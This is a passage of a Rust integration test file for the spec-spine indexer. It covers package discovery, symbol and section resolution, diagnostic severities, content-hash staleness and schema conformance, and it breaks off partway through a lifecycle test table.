//! Index integration tests: determinism, conformance, manifest + npm discovery
//! (the encore fix), file/section/symbol resolution with per-platform span
//! goldens, staleness, and authorities.

use std::fs;
use std::path::Path;

use spec_spine_core::{authorities, index, index_shard_files};
// Freshness / shard-emit helpers are exercised only by the staleness tests, which
// are gated on `symbol-resolution` (spec 025): their `mixed_fixture` declares
// symbol units, so feature-off they emit blocking diagnostics.
#[cfg(feature = "symbol-resolution")]
use spec_spine_core::shard::{self, BY_PACKAGE_DIR, BY_SPEC_DIR};
#[cfg(feature = "symbol-resolution")]
use spec_spine_core::{Freshness, IndexOutcome, check_index_freshness, index_dir};
use spec_spine_types::{Config, INDEX_SCHEMA, LineSpan, PackageKind, Unit};

fn write(root: &Path, rel: &str, content: &str) {
    let p = root.join(rel);
    fs::create_dir_all(p.parent().unwrap()).unwrap();
    fs::write(p, content).unwrap();
}

/// Write an index outcome to disk as the CLI's `spec-spine index` does: the
/// per-spec/per-package shard tree (spec 022), not a monolithic `index.json`.
#[cfg(feature = "symbol-resolution")]
fn emit_index_shards(cfg: &Config, repo: &Path, outcome: &IndexOutcome) {
    let dir = index_dir(cfg, repo);
    let (by_spec, by_package) = index_shard_files(&outcome.shards).unwrap();
    shard::sync_dir(&dir.join(BY_SPEC_DIR), &by_spec).unwrap();
    shard::sync_dir(&dir.join(BY_PACKAGE_DIR), &by_package).unwrap();
}

fn spec(id: &str, body: &str) -> String {
    format!(
        "---\nid: \"{id}\"\ntitle: \"T\"\nstatus: approved\ncreated: \"2026-06-09\"\nsummary: \"s\"\n{body}---\n# {id}\n"
    )
}

/// Like [`spec`] but with an explicit lifecycle `status` (spec 023 fixtures need
/// `draft` corpora; the default helper hardcodes `approved`).
fn spec_with_status(id: &str, status: &str, body: &str) -> String {
    format!(
        "---\nid: \"{id}\"\ntitle: \"T\"\nstatus: {status}\ncreated: \"2026-06-09\"\nsummary: \"s\"\n{body}---\n# {id}\n"
    )
}

/// A mixed Rust + npm fixture exercising manifest discovery, the encore fix, and
/// symbol resolution in both languages.
fn mixed_fixture() -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    let r = tmp.path();

    // Rust workspace + crate.
    write(r, "Cargo.toml", "[workspace]\nmembers = [\"rs-thing\"]\n");
    write(
        r,
        "rs-thing/Cargo.toml",
        "[package]\nname = \"rs-thing\"\nversion = \"0.1.0\"\n[package.metadata.spec-spine]\nspec = \"001-rs\"\n",
    );
    write(
        r,
        "rs-thing/src/lib.rs",
        "pub fn alpha() {}\npub struct Beta {\n    x: u8,\n}\n",
    );

    // npm workspace declared at the ROOT package.json (the encore fix).
    write(
        r,
        "package.json",
        "{\n  \"name\": \"root\",\n  \"workspaces\": [\"pkgs/*\"]\n}\n",
    );
    write(
        r,
        "pkgs/web/package.json",
        "{\n  \"name\": \"web\",\n  \"spec-spine\": { \"spec\": \"002-ts\" }\n}\n",
    );
    write(
        r,
        "pkgs/web/src/util.ts",
        "export function formatDate() {}\nexport class Helper {}\n",
    );

    // Specs declaring symbol units.
    write(
        r,
        "specs/001-rs/spec.md",
        &spec(
            "001-rs",
            "establishes:\n  - { kind: symbol, id: \"rs_thing::alpha\" }\n  - { kind: symbol, id: \"rs_thing::Beta\" }\n  - \"rs-thing/src/lib.rs\"\n",
        ),
    );
    write(
        r,
        "specs/002-ts/spec.md",
        &spec(
            "002-ts",
            "establishes:\n  - { kind: symbol, id: \"web::src::util::formatDate\" }\n",
        ),
    );
    tmp
}

fn mapping<'a>(
    idx: &'a spec_spine_types::CodebaseIndex,
    id: &str,
) -> &'a spec_spine_types::TraceMapping {
    idx.traceability
        .mappings
        .iter()
        .find(|m| m.spec_id == id)
        .expect("mapping present")
}

#[cfg(feature = "symbol-resolution")]
fn symbol_span(m: &spec_spine_types::TraceMapping, sym_id: &str) -> Option<LineSpan> {
    m.resolved_units
        .iter()
        .find(|u| matches!(&u.unit, Unit::Symbol { id, .. } if id == sym_id))
        .and_then(|u| u.locations.first())
        .and_then(|loc| loc.span)
}

#[test]
fn indexes_deterministically() {
    let fx = mixed_fixture();
    let cfg = Config::default();
    let a = index(&cfg, fx.path()).unwrap();
    let b = index(&cfg, fx.path()).unwrap();
    assert_eq!(a.json, b.json, "index must be byte-identical across runs");
    assert!(a.json.ends_with("}\n"));
}

#[test]
fn discovers_rust_and_npm_packages() {
    // The npm package is declared by root package.json#workspaces; the encore
    // failure was that npm packages went undiscovered. They must appear here.
    let fx = mixed_fixture();
    let idx = index(&Config::default(), fx.path()).unwrap().index;

    let names: Vec<&str> = idx.packages.iter().map(|p| p.name.as_str()).collect();
    assert!(
        names.contains(&"rs-thing"),
        "rust crate discovered: {names:?}"
    );
    assert!(
        names.contains(&"web"),
        "npm package discovered (encore fix): {names:?}"
    );

    let web = idx.packages.iter().find(|p| p.name == "web").unwrap();
    assert_eq!(web.kind, PackageKind::NpmPackage);
    assert_eq!(web.spec_ref.as_deref(), Some("002-ts"));
}

#[cfg(feature = "symbol-resolution")]
#[test]
fn resolves_rust_symbols_with_exact_spans() {
    // Per-platform span golden (watch-item 2): pinned tree-sitter ⇒ identical
    // spans on every triple.
    let fx = mixed_fixture();
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    let m = mapping(&idx, "001-rs");
    assert_eq!(symbol_span(m, "rs_thing::alpha"), Some(LineSpan::new(1, 1)));
    assert_eq!(symbol_span(m, "rs_thing::Beta"), Some(LineSpan::new(2, 4)));
}

#[cfg(feature = "symbol-resolution")]
#[test]
fn resolves_typescript_symbols_with_exact_spans() {
    let fx = mixed_fixture();
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    let m = mapping(&idx, "002-ts");
    assert_eq!(
        symbol_span(m, "web::src::util::formatDate"),
        Some(LineSpan::new(1, 1))
    );
}

#[test]
fn missing_file_unit_is_blocking_diagnostic_i004() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec("001-x", "establishes:\n  - \"src/does_not_exist.rs\"\n"),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(idx.diagnostics.errors.iter().any(|d| d.code == "I-004"));
}

// ===== spec 058: the shipped default hashes what it names =====

/// Spec 058 §3.3: the **shipped default** folds real files into the content
/// hash. Until 069 it folded none: `extra_hashed_inputs` defaulted to
/// `["standards/**", ".github/workflows/**"]`, `**` enumerates directories, and
/// `glob_files` keeps only entries that are files, so the default matched
/// nothing. Every adopter who had not overridden the key could rewrite their
/// constitution with `index check` still reporting fresh.
///
/// The fixture deliberately uses `Config::default()` rather than a hand-written
/// `[index]` table. A test that spells its own globs proves the glob engine
/// works and cannot fail when the default rots, which is exactly how this
/// survived: `tests/lint.rs` already pinned that `sub/**` matches nothing and
/// `sub/**/*` matches, and the broken default sat beside it for months.
#[test]
fn the_shipped_default_hashes_the_files_it_names() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(tmp.path(), "specs/001-x/spec.md", &spec("001-x", ""));
    // The two trees the default names, each one directory deeper than the
    // pattern's literal prefix: the pre-069 form matched the directories and
    // discarded them, so a file directly under them is the case that failed.
    write(
        tmp.path(),
        "standards/spec/constitution.md",
        "# Constitution\n",
    );
    write(tmp.path(), ".github/workflows/ci.yml", "name: ci\n");

    let cfg = Config::default();
    let idx = index(&cfg, tmp.path()).unwrap().index;
    let hashed = spec_spine_core::witnessed_paths(&cfg, tmp.path(), &idx);
    for expected in ["standards/spec/constitution.md", ".github/workflows/ci.yml"] {
        assert!(
            hashed.contains(expected),
            "the default did not fold {expected} into the content hash: {hashed:?}"
        );
    }

    // ...and the consequence that matters: editing one of them moves the hash.
    // Membership alone would still pass if the file were collected and then
    // dropped before hashing, which is the shape of the bug this guards.
    let before = spec_spine_core::shard::global_inputs_hash(&cfg, tmp.path());
    write(
        tmp.path(),
        "standards/spec/constitution.md",
        "# Constitution\n\nA governed edit.\n",
    );
    let after = spec_spine_core::shard::global_inputs_hash(&cfg, tmp.path());
    assert_ne!(
        before, after,
        "an edit to a standards file must move the global inputs hash"
    );

    let before_wf = after;
    write(tmp.path(), ".github/workflows/ci.yml", "name: ci2\n");
    assert_ne!(
        before_wf,
        spec_spine_core::shard::global_inputs_hash(&cfg, tmp.path()),
        "an edit to a workflow file must move the global inputs hash"
    );
}

// ===== spec 024: resolution + discovery fixes =====

/// AC-1 (spec 024 D1): a section unit on a foreign (non-workflow) YAML resolves
/// via its `# region:` marker end to end, with no spurious I-006.
#[test]
fn foreign_yaml_section_unit_resolves_no_i006() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "deploy/values.yaml",
        "image:\n  repo: x\n# region: access-gate\nrbac:\n  create: true\n# endregion\n",
    );
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "establishes:\n  - { kind: section, file: \"deploy/values.yaml\", anchor: \"access-gate\" }\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        idx.diagnostics.errors.iter().all(|d| d.code != "I-006"),
        "no spurious I-006 for a present region marker: {:?}",
        idx.diagnostics.errors
    );
    let m = mapping(&idx, "001-x");
    assert!(
        m.resolved_units.iter().any(|u| !u.locations.is_empty()),
        "the section unit resolved to a location"
    );
}

/// AC-4 (spec 024 D3): a non-root pnpm-workspace.yaml resolves its member globs
/// relative to its own directory, not the repo root.
#[test]
fn nested_pnpm_workspace_discovers_members() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "product/pnpm-workspace.yaml",
        "packages:\n  - \"apps/*\"\n",
    );
    write(
        tmp.path(),
        "product/apps/web/package.json",
        "{\n  \"name\": \"web\"\n}\n",
    );
    write(tmp.path(), "specs/001-x/spec.md", &spec("001-x", ""));
    let mut cfg = Config::default();
    cfg.layout.npm_workspaces = vec!["product/pnpm-workspace.yaml".to_string()];
    let idx = index(&cfg, tmp.path()).unwrap().index;
    let names: Vec<&str> = idx.packages.iter().map(|p| p.name.as_str()).collect();
    assert!(
        names.contains(&"web"),
        "nested-workspace member discovered relative to the decl file: {names:?}"
    );
}

// ===== spec 023: lifecycle- and edge-aware unresolved-unit severity =====

/// AC-1: an unresolved unit on a non-owning `references` edge is a counted
/// `W-002` warning, never a blocking error, regardless of lifecycle.
#[test]
fn ac1_unresolved_reference_is_w002_warning_not_error() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "implementation: complete\nreferences:\n  - { unit: { kind: file, path: \"docs/gone.md\" }, role: context }\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        idx.diagnostics.errors.is_empty(),
        "a dangling reference must not block: {:?}",
        idx.diagnostics.errors
    );
    assert_eq!(
        idx.diagnostics
            .warnings
            .iter()
            .filter(|d| d.code == "W-002")
            .count(),
        1,
        "exactly one W-002 for the unresolved reference"
    );
}

/// AC-2: an unresolved owning unit on a `draft` spec is a counted `W-001`
/// warning, never a blocking error (legitimate in-flight work).
#[test]
fn ac2_draft_owning_unit_is_w001_warning_not_error() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec_with_status(
            "001-x",
            "draft",
            "establishes:\n  - \"src/not_built_yet.rs\"\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        idx.diagnostics.errors.is_empty(),
        "a draft spec's unbuilt owning unit must not block: {:?}",
        idx.diagnostics.errors
    );
    assert_eq!(
        idx.diagnostics
            .warnings
            .iter()
            .filter(|d| d.code == "W-001")
            .count(),
        1
    );
}

/// AC-3: `status: approved` but `implementation: pending` is in-flight, so an
/// unresolved owning unit is `W-001` (spec 023 §3.1 arm 2 keys on either signal).
#[test]
fn ac3_pending_owning_unit_is_w001_warning_not_error() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "implementation: pending\nestablishes:\n  - \"src/not_built_yet.rs\"\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        idx.diagnostics.errors.is_empty(),
        "a pending spec's unbuilt owning unit must not block: {:?}",
        idx.diagnostics.errors
    );
    assert_eq!(
        idx.diagnostics
            .warnings
            .iter()
            .filter(|d| d.code == "W-001")
            .count(),
        1
    );
}

/// AC-4: a settled (`approved` + `complete`) spec's missing owning unit stays a
/// hard `I-004` error, unchanged by spec 023 (the complement of AC-2 / AC-3).
#[test]
fn ac4_settled_owning_unit_still_errors_i004() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "implementation: complete\nestablishes:\n  - \"src/gone.rs\"\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(idx.diagnostics.errors.iter().any(|d| d.code == "I-004"));
    assert!(
        idx.diagnostics.warnings.iter().all(|d| d.code != "W-001"),
        "a settled spec is not downgraded"
    );
}

/// AC-5: edge-type precedence. A `references` edge on a `draft` spec is `W-002`
/// (arm 1), not `W-001`: edge authority is evaluated before lifecycle.
#[test]
fn ac5_reference_on_draft_spec_is_w002_edge_type_precedence() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec_with_status(
            "001-x",
            "draft",
            "references:\n  - { unit: { kind: file, path: \"docs/gone.md\" }, role: context }\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(idx.diagnostics.errors.is_empty());
    assert_eq!(
        idx.diagnostics
            .warnings
            .iter()
            .filter(|d| d.code == "W-002")
            .count(),
        1
    );
    assert!(
        idx.diagnostics.warnings.iter().all(|d| d.code != "W-001"),
        "edge-type wins: an unresolved reference is W-002 even on a draft spec"
    );
}

#[test]
fn resolves_section_unit() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "Makefile",
        "build:\n\tcargo build\n\ntest:\n\tcargo test\n",
    );
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "establishes:\n  - { kind: section, file: \"Makefile\", anchor: \"build\" }\n",
        ),
    );
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    let m = mapping(&idx, "001-x");
    let loc = m.resolved_units[0]
        .locations
        .first()
        .expect("section resolved");
    assert_eq!(loc.file, "Makefile");
    assert_eq!(loc.span, Some(LineSpan::new(1, 2)));
}

#[test]
fn conforms_to_embedded_schema() {
    let fx = mixed_fixture();
    let outcome = index(&Config::default(), fx.path()).unwrap();
    let schema: serde_json::Value = serde_json::from_str(INDEX_SCHEMA).unwrap();
    let instance: serde_json::Value = serde_json::from_str(&outcome.json).unwrap();
    let validator = jsonschema::validator_for(&schema).unwrap();
    if !validator.is_valid(&instance) {
        let errs: Vec<String> = validator
            .iter_errors(&instance)
            .map(|e| e.to_string())
            .collect();
        panic!("index.json does not conform:\n{}", errs.join("\n"));
    }
}

#[test]
fn emitted_index_shards_conform_to_embedded_schema() {
    use spec_spine_types::{INDEX_PACKAGE_SHARD_SCHEMA, INDEX_SPEC_SHARD_SCHEMA};
    let fx = mixed_fixture();
    let outcome = index(&Config::default(), fx.path()).unwrap();
    let (by_spec, by_package) = index_shard_files(&outcome.shards).unwrap();
    assert!(!by_spec.is_empty() && !by_package.is_empty());

    let check = |schema_src: &str, files: &[(String, String)]| {
        let schema: serde_json::Value = serde_json::from_str(schema_src).unwrap();
        let validator = jsonschema::validator_for(&schema).unwrap();
        for (name, content) in files {
            let instance: serde_json::Value = serde_json::from_str(content).unwrap();
            if !validator.is_valid(&instance) {
                let errs: Vec<String> = validator
                    .iter_errors(&instance)
                    .map(|e| e.to_string())
                    .collect();
                panic!("index shard {name} does not conform:\n{}", errs.join("\n"));
            }
        }
    };
    check(INDEX_SPEC_SHARD_SCHEMA, &by_spec);
    check(INDEX_PACKAGE_SHARD_SCHEMA, &by_package);
}

// Gated on `symbol-resolution` (spec 025): `mixed_fixture` declares symbol units
// owned by settled specs, which without resolution emit blocking diagnostics, so
// `check_index_freshness` reports the just-emitted index stale (correct contract,
// but it makes this generic-staleness assertion unusable feature-off).
#[cfg(feature = "symbol-resolution")]
#[test]
fn staleness_detects_input_change() {
    let fx = mixed_fixture();
    let cfg = Config::default();
    // Write the index to disk as the CLI would.
    let outcome = index(&cfg, fx.path()).unwrap();
    emit_index_shards(&cfg, fx.path(), &outcome);

    assert_eq!(
        check_index_freshness(&cfg, fx.path()).unwrap(),
        Freshness::Fresh
    );

    // Mutate a hashed input (a spec) -> stale.
    write(
        fx.path(),
        "specs/001-rs/spec.md",
        &spec("001-rs", "owner: \"changed\"\n"),
    );
    assert!(matches!(
        check_index_freshness(&cfg, fx.path()).unwrap(),
        Freshness::Stale { .. }
    ));
}

#[cfg(feature = "symbol-resolution")]
#[test]
fn staleness_detects_symbol_source_line_shift() {
    // The freshness false-negative (spec 004 §3.5): a source-line shift in a file
    // backing a resolved SYMBOL span must report Stale, even though that file is
    // neither a manifest, a spec.md, nor an extra_hashed_input. Before the fix the
    // span-backing source was not hashed, so this read Fresh against stale spans.
    let fx = mixed_fixture();
    let cfg = Config::default();
    let outcome = index(&cfg, fx.path()).unwrap();
    emit_index_shards(&cfg, fx.path(), &outcome);

    // Sanity: the committed index resolved a symbol span into rs-thing/src/lib.rs.
    assert_eq!(
        symbol_span(mapping(&outcome.index, "001-rs"), "rs_thing::Beta"),
        Some(LineSpan::new(2, 4)),
        "fixture must back a symbol span with this source file"
    );
    assert_eq!(
        check_index_freshness(&cfg, fx.path()).unwrap(),
        Freshness::Fresh
    );

    // Prepend a line to the symbol's source file: this shifts every committed
    // span downward but touches no manifest/spec/config. It MUST go Stale.
    write(
        fx.path(),
        "rs-thing/src/lib.rs",
        "// a new leading comment line\npub fn alpha() {}\npub struct Beta {\n    x: u8,\n}\n",
    );
    assert!(
        matches!(
            check_index_freshness(&cfg, fx.path()).unwrap(),
            Freshness::Stale { .. }
        ),
        "a source-line shift behind a resolved symbol span must report Stale"
    );
}

#[test]
fn authorities_resolves_owners() {
    let fx = mixed_fixture();
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    // The file unit established by 001-rs.
    let owners = authorities(&idx, &Unit::file("rs-thing/src/lib.rs"));
    assert!(owners.contains(&"001-rs".to_string()), "owners: {owners:?}");
}

// ===== spec 016: crate / directory / module unit kinds =====

/// The resolved locations for the first resolved unit of `spec_id`.
fn first_unit_locations<'a>(
    idx: &'a spec_spine_types::CodebaseIndex,
    spec_id: &str,
) -> &'a [spec_spine_types::ResolvedLocation] {
    &mapping(idx, spec_id).resolved_units[0].locations
}

/// A Rust crate with an inline `mod tests {}`, a file-module (`helper.rs`), and a
/// nested directory, for exercising the three new unit kinds.
fn module_fixture() -> tempfile::TempDir {
    let tmp = tempfile::tempdir().unwrap();
    let r = tmp.path();
    write(r, "Cargo.toml", "[workspace]\nmembers = [\"rs-thing\"]\n");
    write(
        r,
        "rs-thing/Cargo.toml",
        "[package]\nname = \"rs-thing\"\nversion = \"0.1.0\"\n",
    );
    write(
        r,
        "rs-thing/src/lib.rs",
        "pub fn alpha() {}\n\nmod tests {\n    fn t() {}\n}\n",
    );
    write(r, "rs-thing/src/helper.rs", "pub fn help() {}\n");
    tmp
}

#[test]
fn crate_unit_resolves_to_package_subtree() {
    let fx = module_fixture();
    write(
        fx.path(),
        "specs/001-c/spec.md",
        &spec(
            "001-c",
            "establishes:\n  - { kind: crate, id: \"rs-thing\" }\n",
        ),
    );
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    let locs = first_unit_locations(&idx, "001-c");
    assert_eq!(locs.len(), 1);
    assert_eq!(locs[0].file, "rs-thing");
    // Hyphen/underscore are interchangeable in the crate id.
    assert!(
        authorities(
            &idx,
            &Unit::Crate {
                id: "rs-thing".into(),
                planned: false
            }
        )
        .contains(&"001-c".into())
    );
}

#[test]
fn unknown_crate_unit_is_blocking_diagnostic_i003() {
    let fx = module_fixture();
    write(
        fx.path(),
        "specs/001-c/spec.md",
        &spec(
            "001-c",
            "establishes:\n  - { kind: crate, id: \"ghost\" }\n",
        ),
    );
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    assert!(idx.diagnostics.errors.iter().any(|d| d.code == "I-003"));
}

#[test]
fn directory_unit_resolves_to_subtree() {
    let fx = module_fixture();
    write(
        fx.path(),
        "specs/001-d/spec.md",
        &spec(
            "001-d",
            "establishes:\n  - { kind: directory, path: \"rs-thing/src\" }\n",
        ),
    );
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    let locs = first_unit_locations(&idx, "001-d");
    assert_eq!(locs.len(), 1);
    assert_eq!(locs[0].file, "rs-thing/src");
    assert_eq!(locs[0].span, None);
}

#[test]
fn missing_directory_unit_is_blocking_diagnostic_i007() {
    let fx = module_fixture();
    write(
        fx.path(),
        "specs/001-d/spec.md",
        &spec(
            "001-d",
            "establishes:\n  - { kind: directory, path: \"rs-thing/nope\" }\n",
        ),
    );
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    assert!(idx.diagnostics.errors.iter().any(|d| d.code == "I-007"));
}

#[cfg(feature = "symbol-resolution")]
#[test]
fn module_unit_resolves_inline_and_file_modules() {
    let fx = module_fixture();
    // Inline `mod tests {}` → a line span; the file-module `helper` → whole file.
    write(
        fx.path(),
        "specs/001-m/spec.md",
        &spec(
            "001-m",
            "establishes:\n  - { kind: module, id: \"rs_thing::tests\" }\n  - { kind: module, id: \"rs_thing::helper\" }\n",
        ),
    );
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    let m = mapping(&idx, "001-m");
    let tests_unit = m
        .resolved_units
        .iter()
        .find(|u| matches!(&u.unit, Unit::Module { id, .. } if id == "rs_thing::tests"))
        .unwrap();
    assert_eq!(tests_unit.locations[0].file, "rs-thing/src/lib.rs");
    assert!(
        tests_unit.locations[0].span.is_some(),
        "inline mod resolves to a block span"
    );
    let helper_unit = m
        .resolved_units
        .iter()
        .find(|u| matches!(&u.unit, Unit::Module { id, .. } if id == "rs_thing::helper"))
        .unwrap();
    assert_eq!(helper_unit.locations[0].file, "rs-thing/src/helper.rs");
    assert_eq!(
        helper_unit.locations[0].span, None,
        "a file-module resolves whole-file"
    );
}

#[test]
fn spec_scoped_constrains_produces_no_resolved_unit() {
    // Spec 017: a constrains item with target_specs and no unit claims no code
    // path, so it contributes no resolved unit to the index.
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "constrains:\n  - { kind: sequencing-plan, target_specs: [\"002-y\"] }\n",
        ),
    );
    write(tmp.path(), "specs/002-y/spec.md", &spec("002-y", ""));
    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    assert!(
        mapping(&idx, "001-x").resolved_units.is_empty(),
        "spec-scoped constrains claims no code path"
    );
}

#[test]
fn unresolved_module_unit_is_blocking_diagnostic_i008() {
    let fx = module_fixture();
    write(
        fx.path(),
        "specs/001-m/spec.md",
        &spec(
            "001-m",
            "establishes:\n  - { kind: module, id: \"rs_thing::ghost\" }\n",
        ),
    );
    let idx = index(&Config::default(), fx.path()).unwrap().index;
    assert!(idx.diagnostics.errors.iter().any(|d| d.code == "I-008"));
}

// ===== spec 031: `references` is non-owning, so it seeds no implementing path =====

/// AC-1: an owning edge contributes an implementing path; a `references` edge to
/// an equally-real file does not.
#[test]
fn references_unit_does_not_seed_implementing_paths() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(tmp.path(), "src/owned.rs", "pub fn a() {}\n");
    write(tmp.path(), "src/cited.rs", "pub fn b() {}\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "establishes:\n  - \"src/owned.rs\"\nreferences:\n  - { unit: { kind: file, path: \"src/cited.rs\" }, role: context }\n",
        ),
    );

    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    let m = mapping(&idx, "001-x");
    let paths: Vec<&str> = m
        .implementing_paths
        .iter()
        .map(|p| p.path.as_str())
        .collect();

    assert!(
        paths.contains(&"src/owned.rs"),
        "owning edge must claim: {paths:?}"
    );
    assert!(
        !paths.contains(&"src/cited.rs"),
        "`references` is non-owning and must not claim: {paths:?}"
    );
}

/// AC-2: the reference is filtered from the ownership view only. Its provenance
/// survives in `resolved_units`, flagged `ownership: false`, so a consumer can
/// still see that the spec cites the file.
#[test]
fn references_unit_survives_in_resolved_units() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(tmp.path(), "src/cited.rs", "pub fn b() {}\n");
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec(
            "001-x",
            "references:\n  - { unit: { kind: file, path: \"src/cited.rs\" }, role: context }\n",
        ),
    );

    let idx = index(&Config::default(), tmp.path()).unwrap().index;
    let m = mapping(&idx, "001-x");
    let cited = m
        .resolved_units
        .iter()
        .find(|u| matches!(&u.unit, Unit::File { path, .. } if path == "src/cited.rs"))
        .expect("the reference is still recorded");
    assert!(!cited.ownership, "a `references` unit is non-owning");
    assert_eq!(cited.locations.len(), 1, "and it still resolves");

    // This spec now claims nothing, so it is orphaned. That is the intended
    // reading (it implements nothing), and it must stay a report, not a
    // refusal: an orphan is surfaced by `index orphans`, never as a blocking
    // diagnostic, or dropping the spurious claim would have turned into a gate
    // failure for every spec that only cites.
    assert!(
        idx.traceability
            .orphaned_specs
            .contains(&"001-x".to_string()),
        "a spec with only `references` implements nothing: {:?}",
        idx.traceability.orphaned_specs
    );
    assert!(
        idx.diagnostics.errors.is_empty(),
        "being orphaned is reported, never blocking: {:?}",
        idx.diagnostics.errors
    );
}

/// AC-3, the reported defect end to end: a spec that merely `references`
/// another spec's `spec.md` was named its `C-001` owner, so that spec could not
/// be edited without either touching an unrelated spec or filing a waiver.
#[test]
fn references_does_not_confer_c001_ownership() {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    write(tmp.path(), "specs/001-x/spec.md", &spec("001-x", ""));
    write(
        tmp.path(),
        "specs/002-y/spec.md",
        &spec(
            "002-y",
            "references:\n  - { unit: { kind: file, path: \"specs/001-x/spec.md\" }, role: context }\n",
        ),
    );

    let cfg = Config::default();
    let registry = spec_spine_core::compile(&cfg, tmp.path()).unwrap().registry;
    let idx = index(&cfg, tmp.path()).unwrap().index;

    // 001 edits its own spec.md and nothing else.
    let diff = spec_spine_core::DiffInput {
        files: vec![spec_spine_core::DiffFile {
            path: "specs/001-x/spec.md".to_string(),
            hunks: vec![],
            deleted: false,
        }],
    };
    let report = spec_spine_core::couple_with(&cfg, &registry, &idx, &diff, None).unwrap();
    assert!(
        !report.has_blocking_drift(),
        "a spec editing its own spec.md must clear; 002 only cites it: {:?}",
        report.violations
    );
}

// ===== spec 038: `implementation: complete` defeats draft leniency =====

/// Index a one-spec corpus whose frontmatter is exactly `status` +
/// `implementation`, so the two axes are varied independently.
fn lifecycle_index(status: &str, implementation: Option<&str>) -> spec_spine_types::CodebaseIndex {
    lifecycle_index_with(status, implementation, false)
}

/// As [`lifecycle_index`], but `built` writes the claimed file so the unit
/// resolves, which separates "leniency applied" from "nothing to be lenient
/// about".
fn lifecycle_index_with(
    status: &str,
    implementation: Option<&str>,
    built: bool,
) -> spec_spine_types::CodebaseIndex {
    let tmp = tempfile::tempdir().unwrap();
    write(tmp.path(), "Cargo.toml", "[workspace]\nmembers = []\n");
    if built {
        write(tmp.path(), "src/not_built_yet.rs", "pub fn built() {}\n");
    }
    let lifecycle = implementation
        .map(|i| format!("implementation: {i}\n"))
        .unwrap_or_default();
    write(
        tmp.path(),
        "specs/001-x/spec.md",
        &spec_with_status(
            "001-x",
            status,
            &format!("{lifecycle}establishes:\n  - \"src/not_built_yet.rs\"\n"),
        ),
    );
    index(&Config::default(), tmp.path()).unwrap().index
}

fn counts(idx: &spec_spine_types::CodebaseIndex) -> (usize, usize) {
    (
        idx.diagnostics.errors.len(),
        idx.diagnostics
            .warnings
            .iter()
            .filter(|d| d.code == "W-001")
            .count(),
    )
}

/// Specs 038 and 044: the lifecycle fields are read as what they say. A spec
/// asserting completion is never in flight whatever its `status` (041); one
/// declaring the work unfinished always is, whether `pending` or `in-progress`
/// (044).
///
/// All twelve cells: two `status` values against the five `implementation`
/// variants plus an absent key. Exhaustive on purpose, and literally so, since
/// the point of the table is that a reader adding an `Implementation` variant
/// can tell at a glance whether it is covered. Only the `draft` + `complete`
/// row moves; every other cell states what the predicate already did, so a
/// later reader cannot mistake a gap for a licence to guess.
#[test]
fn completion_defeats_draft_leniency_across_both_axes() {
    // (status, implementation, in flight)
    let cases: [(&str, Option<&str>, bool); 12] = [
        ("draft", Some("pending"), true),
        ("draft", Some("in-progress"), true),
        ("draft", Some("complete"), false), // the only row this spec moves
        ("draft", Some("n-a"), true),
